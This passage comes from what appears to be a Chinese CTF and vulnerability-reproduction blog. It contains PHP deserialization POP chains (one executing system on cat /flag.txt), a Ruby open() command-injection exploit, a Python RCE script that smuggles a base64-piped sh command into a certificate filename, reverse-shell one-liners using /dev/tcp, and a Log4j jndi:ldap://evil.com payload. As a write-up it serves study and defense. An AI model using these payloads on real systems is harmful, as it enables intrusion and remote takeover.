<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$t</span>==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cinder=<span class="keyword">new</span> <span class="title function_ invoke__">ace</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="comment">//public $filename=&#x27;../nssctfasdasdflag&#x27;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;docker=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">acp</span>(<span class="number">0</span>));</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$pop</span>=<span class="keyword">new</span> <span class="title function_ invoke__">acp</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$pks</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$pks</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$pks</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/8800913a0dec4387832b821dbd64ce9e.png" alt="在这里插入图片描述"><br>读取flag.php内容后得知flag在<code>/nssctfasdasdflag</code>下，把路径改为<code>$filename=&#39;../nssctfasdasdflag&#39;</code>后得到flag<br><img src="https://img-blog.csdnimg.cn/4deb15d3e2724ab98b9c3ea0c3d60698.png" alt="在这里插入图片描述"></p>
<h1 id="PNG图片转换器"><a href="#PNG图片转换器" class="headerlink" title="PNG图片转换器"></a>PNG图片转换器</h1><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/index.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/upload.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:file</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>].split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>] == <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    filename = Digest::<span class="variable constant_">MD5</span>.hexdigest(Time.now.to_i.to_s + params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">    open(filename, <span class="string">&#x27;wb&#x27;</span>) &#123; |<span class="params">f</span>|</span><br><span class="line">      f.write open(params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>],<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;Upload success, file stored at <span class="subst">#&#123;filename&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/convert.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">unless</span> params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    file = params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">unless</span> file.index(<span class="string">&#x27;..&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file =~ <span class="regexp">/^(.+)\.png$/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    headers <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    <span class="string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + Base64.encode64(res).gsub(<span class="regexp">/\s*/</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\&quot;;\n&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>该网站是一个将上传的png转换为base64的应用，在转换的代码中有以下部分</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unless</span> file.index(<span class="string">&#x27;..&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file =~ <span class="regexp">/^(.+)\.png$/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<p>file参数必须要以<code>.png</code>结尾，且不能包含<code>..</code>，不能包含<code>/</code>，过滤完成之后会用<code>open(file, &#39;r&#39;).read()</code>打开，而ruby的<code>open()</code>函数是借用系统命令来打开文件的，所以可以进行命令注入，<br>详细原理见<a href="https://h4cking2thegate.github.io/2022/01/17/CVE-2017-17405/">Ruby Net::FTP 模块命令注入漏洞（CVE-2017-17405）漏洞复现</a><br>对于file参数的过滤，可以考虑在命令注入的时候用base64编码后执行<br>直接反弹shell后找到flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@iZ2zec7mjp663ump9wsug3Z:~<span class="comment"># nc -lvvp 6666</span></span><br><span class="line">Listening on [0.0.0.0] (family 0, port 6666)</span><br><span class="line">Connection from 121.196.63.59 34648 received!</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@challenge-7a861c0583f4d167-bc9f5fbc-6pfvt:/usr/src<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">app.rb</span><br><span class="line">view</span><br><span class="line">root@challenge-7a861c0583f4d167-bc9f5fbc-6pfvt:/usr/src<span class="comment"># cd /</span></span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">root@challenge-7a861c0583f4d167-bc9f5fbc-6pfvt:/<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag_13242</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">root@challenge-7a861c0583f4d167-bc9f5fbc-6pfvt:/<span class="comment"># cat flag_13242</span></span><br><span class="line"><span class="built_in">cat</span> flag_13242</span><br><span class="line">ctfhub&#123;9f618324e7abab7465e5fa6c&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2022 初赛</title>
    <url>/2022/05/30/CISCN2022/</url>
    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>tp6反序列化链子，网上很多</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>=[<span class="string">&#x27;jiang&#x27;</span>=&gt;[<span class="string">&#x27;jiang&#x27;</span>=&gt;<span class="string">&#x27;cat$&#123;IFS&#125;/flag.txt&#x27;</span>]];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$withAttr</span>=[<span class="string">&#x27;jiang&#x27;</span>=&gt;[<span class="string">&#x27;jiang&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$json</span>=[<span class="string">&quot;jiang&quot;</span>];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">ModelEvent</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$suffix</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;suffix = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="keyword">new</span> <span class="title class_">Pivot</span>())));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="online-crt"><a href="#online-crt" class="headerlink" title="online_crt"></a>online_crt</h2><p>c_rehash文件存在命令注入，用proxy中的重命名将创建的证书文件名变为payload，再用createlink触<br>发，实现rce</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">proxy=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://eci-2zegvqjy0fqhy23dpkdo.cloudeci1.ichunqiu.com:8888&#x27;</span></span><br><span class="line">cmd=base64.b64encode(<span class="string">&#x27;ls&#x27;</span>.encode()).decode()</span><br><span class="line"><span class="built_in">print</span>(cmd)</span><br><span class="line">payload=urllib.parse.quote(<span class="string">f&#x27;&quot;||echo <span class="subst">&#123;cmd&#125;</span>|base64 -d|sh&gt;mac123||echo&quot;.cer&#x27;</span>)</span><br><span class="line">crt=<span class="string">&#x27;Country=1&amp;Province=1&amp;City=1&amp;OrganizationalName=1&amp;CommonName=1&amp;EmailAddress=1%40q&amp;submit=&#x27;</span></span><br><span class="line"></span><br><span class="line">old = requests.post(url + <span class="string">&quot;/getcrt&quot;</span>,data=crt,proxies=proxy).text</span><br><span class="line"><span class="built_in">print</span>(old)</span><br><span class="line">old = requests.post(url + <span class="string">&quot;/getcrt&quot;</span>,data=crt,proxies=proxy).text.split(<span class="string">&#x27;static/crt/&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(old)</span><br><span class="line">old=urllib.parse.quote(old)</span><br><span class="line"></span><br><span class="line">uri1=&#123;<span class="string">&#x27;uri&#x27;</span>:</span><br><span class="line">       <span class="string">f&quot;/%61%64%6d%69%6e/%72%65%6e%61%6d%65?oldname=<span class="subst">&#123;old&#125;</span>&amp;newname=<span class="subst">&#123;payload&#125;</span> HTTP/1.1\r\n&quot;</span></span><br><span class="line">       <span class="string">&quot;Host: admin\r\n&quot;</span></span><br><span class="line">       <span class="string">&quot;User-Agent: Guest\r\n&quot;</span></span><br><span class="line">       <span class="string">&quot;Accept-Encoding: gzip, deflate\r\n&quot;</span></span><br><span class="line">       <span class="string">&quot;Accept-Language: zh-CN,zh;q=0.9\r\n&quot;</span></span><br><span class="line">       <span class="string">&quot;Connection: close\r\n\r\n&quot;</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">r1=requests.get(url+<span class="string">&quot;/proxy&quot;</span>,data=uri1,proxies=proxy).text</span><br><span class="line"><span class="built_in">print</span>(r1)</span><br><span class="line">link=requests.get(url+<span class="string">&quot;/createlink&quot;</span>).text</span><br><span class="line"><span class="built_in">print</span>(link)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(requests.get(url+<span class="string">&quot;/static/crt/mac123&quot;</span>,proxies=proxy).text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Ruby Net::FTP 模块命令注入漏洞（CVE-2017-17405）漏洞复现</title>
    <url>/2022/01/17/CVE-2017-17405/</url>
    <content><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Ruby Net::FTP 模块是一个 FTP 客户端，在上传和下载文件的过程中，打开本地文件时使用了 <code>open</code> 函数。而在 ruby 中，<code>open</code> 函数是借用系统命令来打开文件，且没用过滤 shell 字符，导致在用户控制文件名的情况下，将可以注入任意命令。<br><a href="https://vulhub.org/#/environments/ruby/CVE-2017-17405/">Vulhub（CVE-2017-17405）</a></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>靶机使用vulhub提供的docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cd /root/vulhub/ruby/CVE-2017-17405                                                           </span></span><br><span class="line">                                                                                                            </span><br><span class="line">┌──(root💀kali)-[~/vulhub/ruby/CVE-2017-17405]</span><br><span class="line">└─<span class="comment"># docker-compose up -d</span></span><br><span class="line">Creating network <span class="string">&quot;cve-2017-17405_default&quot;</span> with the default driver</span><br><span class="line">Creating cve-2017-17405_web_1 ... <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/vulhub/ruby/CVE-2017-17405]</span><br><span class="line">└─<span class="comment"># docker ps           </span></span><br><span class="line">CONTAINER ID   IMAGE                COMMAND                  CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">dcc64104f647   cve-2017-17405_web   <span class="string">&quot;ruby web.rb -p 8080…&quot;</span>   20 seconds ago   Up 19 seconds   0.0.0.0:8080-&gt;8080/tcp, :::8080-&gt;8080/tcp   cve-2017-17405_web_1</span><br><span class="line">                                                                                                            </span><br><span class="line">┌──(root💀kali)-[~/vulhub/ruby/CVE-2017-17405]</span><br><span class="line">└─<span class="comment"># docker exec -it dcc64104f647 /bin/bash</span></span><br><span class="line">root@dcc64104f647:/usr/src<span class="comment"># ls</span></span><br><span class="line">web.rb</span><br><span class="line">root@dcc64104f647:/usr/src<span class="comment"># cat web.rb </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>进入docker后可以看到有一个web.rb文件，这就是一个FTP客户端</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;net/ftp&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;uri&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">    <span class="string">&#x27;Use /download?uri=ftp://127.0.0.1:2121/&amp;file=/path/to/file.txt to download a ftp file.&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/download&#x27;</span> <span class="keyword">do</span></span><br><span class="line">    content_type <span class="string">&#x27;application/octet-stream&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        uri = <span class="variable constant_">URI</span>.parse(params[<span class="string">&#x27;uri&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        ftp = <span class="title class_">Net::FTP</span>.new </span><br><span class="line">        ftp.connect(uri.host, uri.port)</span><br><span class="line">        ftp.login(uri.user |<span class="params"></span>| <span class="string">&#x27;anonymous&#x27;</span>, uri.password)</span><br><span class="line">        ftp.getbinaryfile(params[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        ftp.close</span><br><span class="line">    <span class="keyword">rescue</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;404 Not Found&#x27;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    File.open(params[<span class="string">&#x27;file&#x27;</span>], <span class="string">&#x27;rb&#x27;</span>) &#123;|<span class="params">f</span>|</span><br><span class="line">        <span class="keyword">return</span> f.read</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>环境启动后，访问<a href="http://your-ip:8080/%E5%B0%86%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E4%B8%80%E4%B8%AAHTTP%E6%9C%8D%E5%8A%A1%E3%80%82%E8%BF%99%E4%B8%AAHTTP%E6%9C%8D%E5%8A%A1%E7%9A%84%E4%BD%9C%E7%94%A8%E6%98%AF%EF%BC%8C%E6%88%91%E4%BB%AC%E8%AE%BF%E9%97%AEhttp://your-ip:8080/download?uri=ftp://example.com:2121/&amp;file=vulhub.txt%EF%BC%8C%E5%AE%83%E4%BC%9A%E4%BB%8Eexample.com:2121%E8%BF%99%E4%B8%AAftp%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6vulhub.txt%E5%88%B0%E6%9C%AC%E5%9C%B0%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%86%85%E5%AE%B9%E8%BF%94%E5%9B%9E%E7%BB%99%E7%94%A8%E6%88%B7%E3%80%82">http://your-ip:8080/将可以看到一个HTTP服务。这个HTTP服务的作用是，我们访问http://your-ip:8080/download?uri=ftp://example.com:2121/&amp;file=vulhub.txt，它会从example.com:2121这个ftp服务端下载文件vulhub.txt到本地，并将内容返回给用户。</a><br><img src="https://img-blog.csdnimg.cn/969ef4e512744b9e9a7944d150ade460.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="预期服务功能"><a href="#预期服务功能" class="headerlink" title="预期服务功能"></a>预期服务功能</h1><p>我们需要运行一个可以被访问到的ftp服务端，这里选择在桌面的ftp文件夹中运行，文件夹里面有一个flag.txt可供下载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cd /root/桌面/ftp                                                                             </span></span><br><span class="line">                                                                                                            </span><br><span class="line">┌──(root💀kali)-[~/桌面/ftp]</span><br><span class="line">└─<span class="comment"># ls                                                                  </span></span><br><span class="line">flag.txt</span><br><span class="line">                                                                                                            </span><br><span class="line">┌──(root💀kali)-[~/桌面/ftp]</span><br><span class="line">└─<span class="comment"># python3 -m pyftpdlib -p 2121 -i 0.0.0.0</span></span><br><span class="line">[I 2022-01-17 03:22:09] concurrency model: async</span><br><span class="line">[I 2022-01-17 03:22:09] masquerade (NAT) address: None</span><br><span class="line">[I 2022-01-17 03:22:09] passive ports: None</span><br><span class="line">[I 2022-01-17 03:22:09] &gt;&gt;&gt; starting FTP server on 0.0.0.0:2121, pid=3079 &lt;&lt;&lt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>访问<code>/download?uri=ftp://ftp-ip:2121/&amp;file=flag.txt</code>成功下载了文件<img src="https://img-blog.csdnimg.cn/ed5b119b4e00446a864bb563ce2fa678.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在docker中也可以看到flag.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@dcc64104f647:/usr/src<span class="comment"># ls</span></span><br><span class="line">flag.txt  web.rb</span><br><span class="line">root@dcc64104f647:/usr/src<span class="comment"># cat flag.txt </span></span><br><span class="line">flag&#123;FTP-dowload&#125;</span><br></pre></td></tr></table></figure>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>开始利用漏洞。注入命令<code>|touch$&#123;IFS&#125;success.txt</code>（空格用<code>$&#123;IFS&#125;</code>代替）<br><img src="https://img-blog.csdnimg.cn/4f285979c8d749279dd318ef66662efd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>进入docker后可以看到success.txt被成功创建，命令执行成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@dcc64104f647:/usr/src<span class="comment"># ls</span></span><br><span class="line">flag.txt  success.txt  web.rb</span><br></pre></td></tr></table></figure>

<p><strong>反弹shell</strong><br>构造执行反弹shell的命令<br>linux反弹shell的命令<code>bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/6666 0&gt;&amp;1</code><br><code>|bash$&#123;IFS&#125;-c$&#123;IFS&#125;&#39;&#123;echo,YmFzaCAtaSA...&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</code><br>其中的base64编码中的加号<code>+</code>要替换成<code>%2B</code>，否则浏览器会把<code>+</code>编码成空格，使得命令解码出错<br>同时kali监听6666端口<code>nc -lvvp 6666</code><br>在浏览器中访问即可成功反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -lvvp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">172.18.0.2: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [xxx.xxx.xxx.xxx] from (UNKNOWN) [172.18.0.2] 36762</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@dcc64104f647:/usr/src<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">flag.txt</span><br><span class="line">success.txt</span><br><span class="line">web.rb</span><br><span class="line">root@dcc64104f647:/usr/src<span class="comment"># cat flag.txt</span></span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line">flag&#123;FTP-dowload&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Log4j2远程代码执行漏洞（CVE-2021-44228）漏洞复现</title>
    <url>/2022/03/18/CVE-2021-44228/</url>
    <content><![CDATA[<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<h1 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h1><ul>
<li><p>Apache Log4j 是 Apache 的一个开源项目，Apache Log4j2是一个基于Java的日志记录工具。</p>
</li>
<li><p>该工具重写了Log4j框架，并且引入了大量丰富的特性。</p>
</li>
<li><p>我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。</p>
</li>
<li><p>该日志框架被大量用于业务系统开发，用来记录日志信息。</p>
</li>
<li><p>Apace在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于${jndi:ldap:&#x2F;&#x2F;evil.com&#x2F;example}的lookup用于进行JNDI注入，执行任意代码。</p>
</li>
</ul>
<h1 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h1><blockquote>
<p>Apache Log4j2 2.x &lt;&#x3D; 2.14.1</p>
</blockquote>
<blockquote>
<p>Apache Log4j2 2.15.0-rc1（补丁绕过）</p>
</blockquote>
<p><strong>log4j + ？ &#x3D; rce ！</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> Apache Flink</li>
<li><input checked="" disabled="" type="checkbox"> Apache Struts2</li>
<li><input disabled="" type="checkbox"> Apache Spark</li>
<li><input checked="" disabled="" type="checkbox"> Apache Storm</li>
<li><input disabled="" type="checkbox"> Apache Tomcat</li>
<li><input checked="" disabled="" type="checkbox"> Apache Solr</li>
<li><input disabled="" type="checkbox"> Apache Dubbo</li>
<li><input disabled="" type="checkbox"> Apache Druid</li>
